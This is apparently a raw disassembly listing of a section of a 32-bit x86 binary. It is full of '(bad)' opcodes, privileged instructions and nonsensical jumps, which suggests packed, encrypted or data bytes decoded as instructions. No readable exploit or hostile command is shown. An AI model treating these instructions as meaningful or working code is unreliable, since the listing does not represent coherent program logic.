  427503:	stos   BYTE PTR es:[edi],al
  427504:	imul   edx,DWORD PTR [esi+0x38],0xa71ed8a8
  42750b:	xor    eax,0x17daab05
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	cwde   
  427581:	jg     0x427577
  427583:	sbb    DWORD PTR [eax],0xffffffa4
  427586:	add    DWORD PTR [eax],eax
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	dec    edi
  42758d:	not    BYTE PTR [ebp+0x607dd3de]
  427593:	jg     0x42751f
  427595:	mov    ?,WORD PTR [edi]
  427597:	dec    edi
  427598:	out    0xc7,al
  42759a:	jmp    0x427544
  42759c:	ret    
  42759d:	xchg   ebx,eax
  42759e:	cmp    bl,BYTE PTR [ecx-0x18a74591]
  4275a4:	iret   
  4275a5:	retf   
  4275a6:	dec    edi
  4275a7:	add    DWORD PTR [ebx],ecx
  4275a9:	repnz fwait
  4275ab:	jle    0x42757b
  4275ad:	rol    DWORD PTR [ecx],1
  4275af:	mov    bh,0x85
  4275b1:	xchg   esp,eax
  4275b2:	adc    DWORD PTR [ebp-0x6d07f4a],ebx
  4275b8:	ror    BYTE PTR [eax+0x5995136f],cl
  4275be:	ins    BYTE PTR es:[edi],dx
  4275bf:	push   esp
  4275c0:	aam    0xb8
  4275c2:	cmp    ebp,DWORD PTR [eax-0x7759eb14]
  4275c8:	push   edi
  4275c9:	test   BYTE PTR [ebp-0x54],0xc2
  4275cd:	add    al,0xf5
  4275cf:	inc    ebp
  4275d0:	pop    eax
  4275d1:	mov    ah,0x92
  4275d3:	mov    ?,WORD PTR [eax-0x5c]
  4275d6:	add    ch,cl
  4275d8:	(bad)  
  4275d9:	mov    cl,0x35
  4275db:	dec    esi
  4275dc:	ldmxcsr DWORD PTR [ebp+ebx*2+0x28]
  4275e1:	pop    ecx
  4275e2:	pop    ss
  4275e3:	bound  edx,QWORD PTR [edx-0x3b]
  4275e6:	xor    al,0xf7
  4275e8:	or     eax,0x8c60e30b
  4275ed:	mov    esi,0x138b6425
  4275f2:	mov    ebp,edx
  4275f4:	mov    cl,0x1e
  4275f6:	rcl    DWORD PTR [esi+0x67],1
  4275f9:	jo     0x42758d
  4275fb:	js     0x427669
  4275fd:	retf   0x7fe2
  427600:	add    BYTE PTR [esi-0x54],0x91
  427604:	mov    ebp,0x9c19ba29
  427609:	mov    ah,BYTE PTR [ecx]
  42760b:	jbe    0x4275f9
  42760d:	jns    0x427592
  42760f:	mov    al,ds:0xffcf28a9
  427614:	scas   eax,DWORD PTR es:[edi]
  427615:	fiadd  DWORD PTR [ebx-0x15]
  427618:	call   0xc713be5b
  42761d:	cmp    ch,BYTE PTR [edi]
  42761f:	jbe    0x42764e
  427621:	adc    eax,0x22052acc
  427626:	fidivr WORD PTR [ebp+esi*4-0x71]
  42762a:	addr16 mov edx,eax
  42762d:	and    eax,0xedaca040
  427632:	imul   ebx,DWORD PTR [ebx-0x7eb60ae4],0x396b143c
  42763c:	jb     0x427630
  42763e:	ins    BYTE PTR es:[edi],dx
  42763f:	test   DWORD PTR [esi-0x66],0xf907d9a
  427646:	cli    
  427647:	add    al,BYTE PTR ds:0x892ae12e
  42764d:	sub    esi,DWORD PTR [edi-0x3d5c45f7]
  427653:	jg     0x4276ba
  427655:	ins    DWORD PTR es:[edi],dx
  427656:	xlat   BYTE PTR ds:[ebx]
  427657:	inc    ecx
  427658:	pop    ds
  427659:	(bad)  
  42765a:	jmp    0x42766d
  42765c:	add    BYTE PTR [edi+0x44be5fff],al
  427662:	mov    esp,0x495998f3
  427667:	fsubr  DWORD PTR [ebx-0x265b1d12]
  42766d:	push   esp
  42766e:	jecxz  0x4276b4
  427670:	imul   eax,DWORD PTR [esi-0x6ad67c09],0xffffff90
  427677:	xchg   esi,eax
  427678:	xor    ebx,esi
  42767a:	dec    eax
  42767b:	mov    al,ds:0xa129ba80
  427680:	jae    0x427617
  427682:	in     al,dx
  427683:	dec    eax
  427684:	lods   eax,DWORD PTR ds:[esi]
  427685:	sbb    ecx,DWORD PTR [ebp+eiz*4+0xc]
  427689:	cmp    al,0xd2
  42768b:	mov    eax,ds:0x8ed7fb72
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fld    DWORD PTR [edi]
  427701:	dec    eax
  427702:	jno    0x4276fd
  427704:	sbb    al,0xa5
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	adc    al,0xbe
  42770e:	mov    dl,BYTE PTR [ebx-0x4b39d627]
  427714:	pop    esp
  427715:	add    dl,BYTE PTR [esi]
  427717:	arpl   WORD PTR [ebx-0x80],dx
  42771a:	popf   
  42771b:	ret    
  42771c:	and    DWORD PTR [eax+0x1b],ecx
  42771f:	jge    0x4276be
  427721:	mov    ecx,0xa3548e10
  427726:	xor    BYTE PTR [edi+0x22],dl
  427729:	push   0x3c
  42772b:	mov    edx,0xf27ee401
  427730:	inc    edx
  427731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427732:	push   ds
  427733:	ror    dh,1
  427735:	repnz add BYTE PTR [ebx],dh
  427738:	mov    dl,bh
  42773a:	push   ecx
  42773b:	popf   
  42773c:	sub    eax,0x14de07fe
  427741:	xchg   edx,eax
  427742:	scas   al,BYTE PTR es:[edi]
  427743:	test   DWORD PTR [ecx-0x607eafb4],eax
  427749:	dec    al
  42774b:	pop    ss
  42774c:	mov    ecx,0xe5f1f814
  427751:	mov    edi,0x4050ab5e
  427756:	push   ebx
  427757:	push   ds
  427758:	mov    bh,0xb6
  42775a:	jnp    0x4276e8
  42775c:	add    al,0x5b
  42775e:	iret   
  42775f:	aad    0x3e
  427761:	push   ebx
  427762:	xchg   ecx,eax
  427763:	mov    eax,0x4e74251f
  427768:	cmp    dl,BYTE PTR [esi+0x8fc803f]
  42776e:	stc    
  42776f:	dec    esp
  427770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427771:	fstp   TBYTE PTR [eax+0x36]
  427774:	jnp    0x427795
  427776:	ret    
  427777:	icebp  
  427778:	sub    BYTE PTR [edi-0x4a],bl
  42777b:	push   cs
  42777c:	out    0x4c,al
  42777e:	popf   
  42777f:	jae    0x4277ab
  427781:	jnp    0x42778b
  427783:	icebp  
  427784:	pop    esp
  427785:	pop    edi
  427786:	in     al,dx
  427787:	iret   
  427788:	inc    esi
  427789:	adc    BYTE PTR [ebp-0x49],cl
  42778c:	adc    al,0xdc
  42778e:	or     BYTE PTR [eax+ecx*4],ch
  427791:	fsubr  st(3),st
  427793:	jl     0x427738
  427795:	in     eax,0x57
  427797:	repz mov edx,0x52aa97ae
  42779d:	out    0x61,al
  42779f:	(bad)  
  4277a0:	sbb    al,0x3b
  4277a2:	mov    edi,0xe64dbde4
  4277a7:	xor    eax,0xcb0131c2
  4277ac:	les    ebp,FWORD PTR [esi]
  4277ae:	ss mov ah,0x17
  4277b1:	cdq    
  4277b2:	xchg   edi,edi
  4277b4:	stos   DWORD PTR es:[edi],eax
  4277b5:	(bad)  
  4277b6:	sbb    BYTE PTR [ecx-0x1],ch
  4277b9:	jno    0x427786
  4277bb:	pop    esi
  4277bc:	mov    cl,0xb
  4277be:	pop    es
  4277bf:	sub    BYTE PTR [edx-0x28],0xfd
  4277c3:	fmul   QWORD PTR [esi+0x29f5d256]
  4277c9:	dec    eax
  4277ca:	leave  
  4277cb:	sbb    ch,BYTE PTR [ebp+0x3e]
  4277ce:	and    DWORD PTR [edx],esi
  4277d0:	clc    
  4277d1:	pop    es
  4277d2:	(bad)  
  4277d3:	scas   al,BYTE PTR es:[edi]
  4277d4:	or     al,BYTE PTR [eax-0x702dc229]
  4277da:	jae    0x42780f
  4277dc:	sub    al,0xe4
  4277de:	idiv   DWORD PTR [ebp+0x75714566]
  4277e4:	mov    bh,BYTE PTR [edi+0x736fdd71]
  4277ea:	sub    BYTE PTR [edi],bl
  4277ec:	mov    bl,0x88
  4277ee:	push   esi
  4277ef:	push   ss
  4277f0:	adc    al,0xf6
  4277f2:	inc    esi
  4277f3:	and    ebp,esi
  4277f5:	in     eax,dx
  4277f6:	push   0x4c
  4277f8:	into   
  4277f9:	div    BYTE PTR [edi]
  4277fb:	push   edx
  4277fc:	sub    DWORD PTR [edi+eax*1+0x7e],esp
  427800:	pop    esp
  427801:	push   ebp
  427802:	loope  0x4277ef
  427804:	ins    BYTE PTR es:[edi],dx
  427805:	sbb    al,0x66
  427807:	dec    ebx
  427808:	sbb    edi,DWORD PTR [ecx+0x491ee782]
  42780e:	push   ecx
  42780f:	scas   al,BYTE PTR es:[edi]
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	adc    DWORD PTR [ecx],esp
  427882:	addr16 cld 
  427884:	and    BYTE PTR [esi+0x1040001],ah
  42788a:	add    BYTE PTR [eax],al
  42788c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42788d:	dec    edi
  42788e:	inc    esp
  42788f:	dec    esi
  427890:	enter  0xa0c9,0x20
  427894:	xchg   edx,eax
  427895:	adc    bh,BYTE PTR [edi+eiz*4]
  427898:	mov    ds:0xcdaa7f83,eax
  42789d:	cwde   
  42789e:	sub    ebp,DWORD PTR [edi+0x684772f6]
  4278a4:	adc    al,0x4e
  4278a6:	icebp  
  4278a7:	and    BYTE PTR [ebp+0x13],bh
  4278aa:	repz repnz fwait
  4278ad:	repz mov edx,0x68d9ef8
  4278b3:	or     DWORD PTR [eax-0x4dfefc28],esp
  4278b9:	push   ebx
  4278ba:	cmp    eax,0x8caa0db6
  4278bf:	cmp    al,0x8c
  4278c1:	sbb    al,0x5
  4278c3:	or     edi,DWORD PTR [edi+0x1302f864]
  4278c9:	lahf   
  4278ca:	cli    
  4278cb:	adc    BYTE PTR [edx+eax*8],bl
  4278ce:	dec    edx
  4278cf:	outs   dx,DWORD PTR ds:[esi]
  4278d0:	(bad)  
  4278d2:	add    al,0x2
  4278d4:	push   ecx
  4278d5:	dec    eax
  4278d6:	cmp    dl,BYTE PTR [esi-0x3c]
  4278d9:	xor    ecx,0xffffffbb
  4278dc:	jle    0x42791f
  4278de:	mov    cl,0xea
  4278e0:	jne    0x427912
  4278e2:	fst    QWORD PTR [esi+0x2a]
  4278e5:	xor    DWORD PTR [edi+ebp*4],ebp
  4278e8:	outs   dx,DWORD PTR ds:[esi]
  4278e9:	dec    BYTE PTR ds:0x4aa64442
  4278ef:	jecxz  0x427940
  4278f1:	add    BYTE PTR [edx],0xff
  4278f4:	out    dx,al
  4278f5:	retf   0x8dbc
  4278f8:	xor    eax,0x81562bc2
  4278fd:	cdq    
  4278fe:	pop    ds
  4278ff:	xchg   ebp,eax
  427900:	cs jp  0x427930
  427903:	imul   ebp,DWORD PTR [ebp-0x75],0xbbe9a1f8
  42790a:	ins    BYTE PTR es:[edi],dx
  42790b:	xor    edi,DWORD PTR [edx]
  42790d:	adc    al,0x75
  42790f:	pop    ebx
  427910:	push   es
  427911:	mov    esi,0x8dc04dd7
  427916:	mov    ds:0x5f82f693,al
  42791b:	sub    al,0x6d
  42791d:	sti    
  42791e:	cld    
  42791f:	xchg   edi,eax
  427920:	imul   ebx,DWORD PTR [edi+0x29],0x5c
  427924:	mov    dl,0x1b
  427926:	fsub   QWORD PTR [ecx+eax*8]
  427929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42792a:	enter  0xa788,0x49
  42792e:	mov    esi,0xfb1351d
  427933:	xchg   ecx,eax
  427934:	and    esp,ecx
  427936:	mov    ah,0x39
  427938:	sbb    dh,bh
  42793a:	pop    ebp
  42793b:	cdq    
  42793c:	add    BYTE PTR ds:0x222beeea,dh
  427942:	dec    ecx
  427943:	mov    WORD PTR [ebx-0x7311c536],gs
  427949:	lea    edi,[esi+0x2b]
  42794c:	sub    al,0xaf
  42794e:	dec    edi
  42794f:	sbb    BYTE PTR [edi+ecx*1+0x71],dl
  427953:	mov    ch,0x2d
  427955:	sub    ebp,DWORD PTR [ecx+0x3151c212]
  42795b:	out    dx,al
  42795c:	icebp  
  42795d:	sti    
  42795e:	dec    ebx
  42795f:	mov    bh,BYTE PTR [edi-0x4bd97d85]
  427965:	and    eax,0x318c5033
  42796a:	mov    ebx,0x54cd2c22
  42796f:	mov    dh,0xa4
  427971:	dec    edx
  427972:	dec    ebx
  427973:	xor    bl,BYTE PTR [esi+0x38]
  427976:	cmc    
  427977:	mov    ebp,0x2182c446
  42797c:	loope  0x4279a3
  42797e:	cmp    al,BYTE PTR [esi-0x4eea088]
  427984:	sbb    DWORD PTR ds:0xba34c9d3,ebp
  42798a:	jl     0x427983
  42798c:	mov    ch,0xe2
  42798e:	mov    edi,0x53
	...
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x7274d60a]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	dec    ebp
  427a0d:	sub    al,0xa6
  427a0f:	pop    esi
  427a10:	mov    ds:0xb0f23c00,al
  427a15:	push   edi
  427a16:	pusha  
  427a17:	pop    eax
  427a18:	sub    BYTE PTR [ecx],bl
  427a1a:	pcmpeqb mm2,mm0
  427a1d:	cdq    
  427a1e:	cmc    
  427a1f:	mov    ds:0xe4fb12de,eax
  427a24:	scas   al,BYTE PTR es:[edi]
  427a25:	xor    edx,edi
  427a27:	das    
  427a28:	pop    ebp
  427a29:	adc    eax,0x7f4f02df
  427a2e:	inc    esi
  427a2f:	xchg   BYTE PTR [ebx+0x13],bl
  427a32:	pushf  
  427a33:	sbb    eax,0x89d46ad6
  427a38:	xor    bh,dh
  427a3a:	xor    BYTE PTR [edi+0x2f],dl
  427a3d:	cmp    esp,DWORD PTR [ebp+0x10]
  427a40:	mov    ebp,0xda1340f7
  427a45:	out    dx,eax
  427a46:	mov    esp,0x90ffbe80
  427a4b:	test   DWORD PTR [eax+0x54492247],esp
  427a51:	sub    eax,0x59bba0a
  427a56:	push   es
  427a57:	pop    esi
  427a58:	ins    BYTE PTR es:[edi],dx
  427a59:	(bad)  
  427a5a:	mov    eax,ds:0xd7e80abc
  427a5f:	mov    ebx,0x47d6d0fb
  427a64:	xor    BYTE PTR [ecx-0xac323b7],0x40
  427a6b:	and    eax,0x51e343fb
  427a70:	sub    DWORD PTR [esi],edi
  427a72:	hlt    
  427a73:	xlat   BYTE PTR ds:[ebx]
  427a74:	fadd   st(2),st
  427a76:	jle    0x4279fd
  427a78:	xor    BYTE PTR [edi-0x16],bh
  427a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a7c:	or     BYTE PTR [eax-0x2e4d2c55],cl
  427a82:	push   0xd6b1a674
  427a87:	cli    
  427a88:	addr16 xchg ecx,eax
  427a8a:	mov    ch,0x12
  427a8c:	ss dec DWORD PTR es:[bp+0x70]
  427a92:	hlt    
  427a93:	push   esi
  427a94:	pop    esp
  427a95:	call   0xbabc:0xef03670f
  427a9c:	jae    0x427aac
  427a9e:	sbb    ah,0xf0
  427aa1:	icebp  
  427aa2:	mov    ebx,0xb11ed18a
  427aa7:	cdq    
  427aa8:	idiv   DWORD PTR [esi-0x4c]
  427aab:	mov    cl,0xfe
  427aad:	dec    edx
  427aae:	hlt    
  427aaf:	dec    esi
  427ab0:	loop   0x427a91
  427ab2:	ror    dh,cl
  427ab4:	dec    ebp
  427ab5:	mov    cl,0x9a
  427ab7:	or     al,0xc2
  427ab9:	pop    ebp
  427aba:	xlat   BYTE PTR ds:[ebx]
  427abb:	sub    eax,0xd9112f62
  427ac0:	inc    ebx
  427ac1:	test   eax,0xf9ea6c4c
  427ac6:	addr16 js 0x427af9
  427ac9:	inc    esp
  427aca:	out    dx,al
  427acb:	sub    al,0x2d
  427acd:	pop    ecx
  427ace:	jbe    0x427b34
  427ad0:	adc    BYTE PTR [eax-0x9860b45],dl
  427ad6:	sub    al,0x90
  427ad8:	adc    ch,BYTE PTR [eax+ecx*2-0xe]
  427adc:	std    
  427add:	push   ebx
  427adf:	fstp   QWORD PTR [edi]
  427ae1:	aas    
  427ae2:	mov    dh,dl
  427ae4:	fwait
  427ae5:	nop
  427ae6:	movups xmm3,XMMWORD PTR [edi+0x61]
  427aea:	stos   BYTE PTR es:[edi],al
  427aeb:	jl     0x427b37
  427aed:	(bad)  
  427aee:	or     edi,ebx
  427af0:	push   ebp
  427af1:	das    
  427af2:	push   ebp
  427af3:	dec    ebx
  427af4:	jo     0x427b69
  427af6:	scas   al,BYTE PTR es:[edi]
  427af7:	mov    al,0xe1
  427af9:	das    
  427afa:	push   cs
  427afb:	inc    eax
  427afc:	(bad)  
  427afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427afe:	gs ret 
  427b00:	int    0x5
  427b02:	jns    0x427b35
  427b04:	inc    ebx
  427b06:	jnp    0x427a99
  427b08:	call   0x8743:0x6f8c21c
  427b0f:	push   0x0
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	imul   BYTE PTR [esi-0x77]
  427b82:	xchg   BYTE PTR [eax+0x1a828],bh
  427b88:	add    al,0x1
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	out    dx,al
  427b8d:	ins    BYTE PTR es:[edi],dx
  427b8e:	mov    WORD PTR [edx],fs
  427b90:	jp     0x427bbf
  427b92:	ins    BYTE PTR es:[edi],dx
  427b93:	inc    ebp
  427b94:	enter  0x85cf,0xad
  427b98:	add    ebx,DWORD PTR [eax+0x3]
  427b9b:	aaa    
  427b9c:	sub    eax,0xe1eedb13
  427ba1:	shr    DWORD PTR [eax+0x25],0x1f
  427ba5:	mov    esp,ebx
  427ba7:	ror    BYTE PTR [ebx],0x8f
  427baa:	cmp    bl,dh
  427bac:	test   BYTE PTR [ecx+0x1b7bd31c],cl
  427bb2:	cmp    edi,ebp
  427bb4:	jne    0x427be2
  427bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bb7:	data16 test BYTE PTR [ebx],dh
  427bba:	(bad)  
  427bbc:	xor    dl,BYTE PTR [eax-0x8]
  427bbf:	je     0x427be8
  427bc1:	inc    edi
  427bc2:	jmp    0x58266555
  427bc7:	inc    esi
  427bc8:	popf   
  427bc9:	sub    dl,BYTE PTR [ebx+0x46]
  427bcc:	mov    bh,0x69
  427bce:	lds    edx,FWORD PTR [edi+0x22a8c923]
  427bd4:	jl     0x427c09
  427bd6:	cmp    eax,0x46d3957d
  427bdb:	push   0x6e
  427bdd:	mov    edi,0x445e7aed
  427be2:	sbb    DWORD PTR [ecx+0x2b12e8cb],0xaa52cb70
  427bec:	out    dx,al
  427bed:	mov    ds:0xd42d44ec,al
  427bf2:	fs sti 
  427bf4:	mov    ch,0x2a
  427bf6:	pop    ds
  427bf7:	jp     0x427bb5
  427bf9:	fs js  0x427c42
  427bfc:	adc    BYTE PTR [edi],ah
  427bfe:	mov    dh,dh
  427c00:	cmp    eax,0x8c7f317b
  427c05:	push   edx
  427c06:	xchg   esi,eax
  427c07:	loope  0x427bbe
  427c09:	xor    eax,0x1ebf9add
  427c0e:	mov    ch,BYTE PTR [ebx+0x5233f0af]
  427c14:	pop    ecx
  427c15:	scas   al,BYTE PTR es:[edi]
  427c16:	or     DWORD PTR [edi],ebx
  427c18:	cdq    
  427c19:	pop    edx
  427c1a:	ss add ecx,ebx
  427c1d:	xlat   BYTE PTR ds:[ebx]
  427c1e:	adc    al,0x44
  427c20:	inc    ebx
  427c21:	xchg   edi,eax
  427c22:	add    ebx,DWORD PTR [esi]
  427c24:	imul   eax,DWORD PTR [edx+0x1482fd08],0x28
  427c2b:	xchg   ebx,eax
  427c2c:	and    al,0x67
  427c2e:	cmp    DWORD PTR [edx-0x30],edx
  427c31:	jbe    0x92a6061d
  427c37:	sbb    ah,BYTE PTR [ebp+eax*4-0x453a87d7]
  427c3e:	jge    0x427bf3
  427c40:	fdiv   st,st(7)
  427c42:	and    eax,0x18b54ec2
  427c47:	sub    bh,cl
  427c49:	dec    ebx
  427c4a:	inc    edi
  427c4b:	fistp  DWORD PTR [ecx]
  427c4d:	push   ebx
  427c4e:	xchg   ebp,eax
  427c4f:	test   BYTE PTR [eax+ebx*1],ch
  427c52:	loopne 0x427c61
  427c54:	add    eax,0xd23ce56b
  427c59:	scas   eax,DWORD PTR es:[edi]
  427c5a:	div    DWORD PTR [edx]
  427c5c:	mov    BYTE PTR [edx-0x18],0xa5
  427c60:	loopne 0x427c8c
  427c62:	jle    0x427c7a
  427c64:	mov    eax,0x16533f22
  427c69:	enter  0x44e6,0x62
  427c6d:	jo     0x427c45
  427c6f:	jns    0x427cc7
  427c71:	add    DWORD PTR [ecx+eax*1-0x47],edx
  427c75:	xchg   esp,eax
  427c76:	mov    ecx,0x8a1f12ae
  427c7b:	jne    0x427cd7
  427c7d:	mov    esi,ebp
  427c7f:	iret   
  427c80:	fadd   DWORD PTR [ebx]
  427c82:	sbb    BYTE PTR [ecx-0x44],0xaa
  427c86:	push   ebx
  427c87:	jmp    0x912b:0xc97debec
  427c8e:	loopne 0x427cdd
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xcc535d44,ebx
  427d02:	dec    edx
  427d03:	mov    ch,BYTE PTR [ecx+ebp*4]
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	xchg   esp,esp
  427d0e:	dec    ebp
  427d0f:	(bad)  
  427d10:	ins    DWORD PTR es:[edi],dx
  427d11:	jmp    0x427ccd
  427d13:	popf   
  427d14:	push   edx
  427d15:	sub    DWORD PTR [ebp+0x28],edx
  427d18:	ins    BYTE PTR es:[edi],dx
  427d19:	aam    0xf
  427d1b:	daa    
  427d1c:	jecxz  0x427d14
  427d1e:	jmp    0x7d7afdf3
  427d23:	cmc    
  427d24:	dec    ebx
  427d25:	ins    BYTE PTR es:[edi],dx
  427d26:	push   edx
  427d27:	mov    DWORD PTR [ecx],eax
  427d29:	dec    esi
  427d2a:	dec    ebx
  427d2b:	cmp    ecx,DWORD PTR [eax]
  427d2d:	mov    bh,BYTE PTR [eax+0x110af9a5]
  427d33:	pop    es
  427d34:	fs scas al,BYTE PTR es:[edi]
  427d36:	dec    DWORD PTR [eiz*1+0x12f552e8]
  427d3d:	xchg   edx,eax
  427d3e:	add    eax,0x5e480595
  427d43:	(bad)  
  427d44:	or     DWORD PTR [esi],edx
  427d46:	call   0xc0616a5
  427d4b:	mov    bh,0xf6
  427d4d:	test   BYTE PTR [ecx],cl
  427d4f:	mov    bh,0x59
  427d51:	or     BYTE PTR [edx+0x2b],dh
  427d54:	xlat   BYTE PTR ds:[ebx]
  427d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d56:	std    
  427d57:	xor    al,0xae
  427d59:	into   
  427d5a:	inc    ebp
  427d5b:	pop    ds
  427d5c:	or     eax,0x11613746
  427d61:	(bad)  
  427d62:	and    al,0x76
  427d64:	jecxz  0x427d20
  427d66:	pop    ecx
  427d67:	sub    ebx,edi
  427d69:	std    
  427d6a:	pop    eax
  427d6b:	sbb    ebx,0xffffffc5
  427d6e:	stos   BYTE PTR es:[edi],al
  427d6f:	sub    ebx,edi
  427d71:	lahf   
  427d72:	xchg   edi,eax
  427d73:	pop    ecx
  427d74:	mov    eax,ds:0x998e46d0
  427d79:	sahf   
  427d7a:	cs pushf 
  427d7c:	dec    edi
  427d7d:	repnz sub DWORD PTR [edx-0x45],ebx
  427d81:	lds    edx,FWORD PTR [edx-0x58]
  427d84:	xlat   BYTE PTR ss:[ebx]
  427d86:	jns    0x427d5d
  427d88:	mov    eax,ds:0x618aabf7
  427d8d:	and    BYTE PTR [edi-0x24807d08],dl
  427d93:	pop    ss
  427d94:	and    bl,BYTE PTR [esi]
  427d96:	arpl   WORD PTR [ecx],di
  427d98:	xchg   esp,eax
  427d99:	sub    al,0x9e
  427d9b:	jo     0x427d9f
  427d9d:	ret    0x1c76
  427da0:	mov    edx,0x53cf9962
  427da5:	mov    cl,0xc3
  427da7:	fcmovnbe st,st(1)
  427da9:	mov    WORD PTR [ecx+0x64231b73],es
  427daf:	pop    edi
  427db0:	shr    BYTE PTR [ebx],0x55
  427db3:	call   0x493652ab
  427db8:	xchg   ebx,eax
  427db9:	imul   eax,edx,0xa1d77f1
  427dbf:	clc    
  427dc0:	imul   edx,ebx,0x3cece971
  427dc6:	and    edx,DWORD PTR [ebx-0x793d68d5]
  427dcc:	mov    cl,0x15
  427dce:	sub    al,0xa9
  427dd0:	lock push 0xffffffde
  427dd3:	sub    DWORD PTR [edi],0x134d92c1
  427dd9:	ins    DWORD PTR es:[edi],dx
  427dda:	js     0x427e23
  427ddc:	call   0xea12cbf8
  427de1:	scas   al,BYTE PTR es:[edi]
  427de2:	xchg   ebx,eax
  427de3:	mov    edx,0x93781858
  427de8:	jne    0x427d87
  427dea:	mov    al,ds:0xe16aff17
  427def:	push   esi
  427df0:	jb     0x427dcc
  427df2:	xor    eax,0x26f9c57b
  427df7:	std    
  427df8:	ret    0xb735
  427dfb:	sub    ebx,DWORD PTR [ebp-0x10]
  427dfe:	mov    ds:0xfc9dedb,al
  427e03:	cmp    DWORD PTR [ecx+0x65af4310],ebx
  427e09:	mov    dl,0x17
  427e0b:	adc    eax,0xe7305bda
	...
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	pop    ebp
  427e81:	mov    ch,0xed
  427e83:	xchg   edx,eax
  427e84:	xor    BYTE PTR [edx+0x1040001],ch
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	scas   al,BYTE PTR es:[edi]
  427e8d:	sbb    BYTE PTR [edi-0x58],cl
  427e90:	fiadd  DWORD PTR [ebx-0x58]
  427e93:	cli    
  427e94:	sbb    eax,0xf4cbae76
  427e99:	stos   BYTE PTR es:[edi],al
  427e9a:	xchg   ecx,eax
  427e9b:	and    ecx,esi
  427e9d:	jnp    0x427e98
  427e9f:	pusha  
  427ea0:	mov    ah,0x5a
  427ea2:	outs   dx,BYTE PTR ds:[si]
  427ea4:	fsub   QWORD PTR [ecx]
  427ea6:	xchg   ebx,eax
  427ea7:	(bad)  
  427ea8:	ins    DWORD PTR es:[edi],dx
  427ea9:	fcomp  QWORD PTR [esi+0x6a]
  427eac:	leave  
  427ead:	enter  0xc2eb,0x83
  427eb1:	dec    eax
  427eb2:	cmp    al,BYTE PTR [edi+0x5e6357ed]
  427eb8:	fwait
  427eb9:	mov    eax,0xf558a19b
  427ebe:	ss imul eax,esp,0xffffff84
  427ec2:	and    ebp,esi
  427ec4:	push   cs
  427ec5:	sbb    bl,BYTE PTR [ebp-0x1ac6e8e6]
  427ecb:	fwait
  427ecc:	retf   
  427ecd:	xchg   ebx,eax
  427ece:	pop    esp
  427ecf:	push   ss
  427ed0:	lods   al,BYTE PTR ds:[esi]
  427ed1:	mov    DWORD PTR [esi-0x21f43bbe],edx
  427ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ed8:	rcl    DWORD PTR [edi-0x6b],1
  427edb:	shl    DWORD PTR [esi],cl
  427edd:	fwait
  427ede:	dec    ebp
  427edf:	shl    ebx,1
  427ee1:	add    esp,DWORD PTR [ebp+0x0]
  427ee4:	xor    DWORD PTR [ecx],ebp
  427ee6:	pop    eax
  427ee7:	ror    esi,1
  427ee9:	and    bh,ah
  427eeb:	cwde   
  427eec:	call   0xb94a12cf
  427ef1:	aam    0x33
  427ef3:	shl    BYTE PTR [ebx],1
  427ef5:	xchg   BYTE PTR [edi-0x1138f755],al
  427efb:	xchg   edi,eax
  427efc:	ins    BYTE PTR es:[edi],dx
  427efd:	retf   0x66f5
  427f00:	bnd jne 0x427f5e
  427f03:	xchg   ebp,eax
  427f04:	push   ebp
  427f05:	or     edx,DWORD PTR [esi+0x7b]
  427f08:	inc    esi
  427f09:	test   al,0x70
  427f0b:	jp     0x427f15
  427f0d:	outs   dx,BYTE PTR ds:[esi]
  427f0e:	in     eax,dx
  427f0f:	cmp    al,0xd9
  427f11:	sbb    BYTE PTR [ebx+0x0],ch
  427f14:	icebp  
  427f15:	mov    bl,0x7b
  427f17:	cmp    al,0xc
  427f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f1a:	sbb    eax,0x5a91383a
  427f1f:	scas   al,BYTE PTR es:[edi]
  427f20:	(bad)  
  427f21:	gs jne 0x427f10
  427f24:	push   cs
  427f25:	and    BYTE PTR [esi+0x2727ef58],ah
  427f2b:	fisttp DWORD PTR [edx-0x71]
  427f2e:	lock adc al,0x65
  427f31:	add    DWORD PTR [esi-0x73],eax
  427f34:	push   es
  427f35:	mov    WORD PTR [edx+0x3e7f7577],fs
  427f3b:	mov    cl,0x72
  427f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f3e:	push   0x20
  427f40:	(bad)
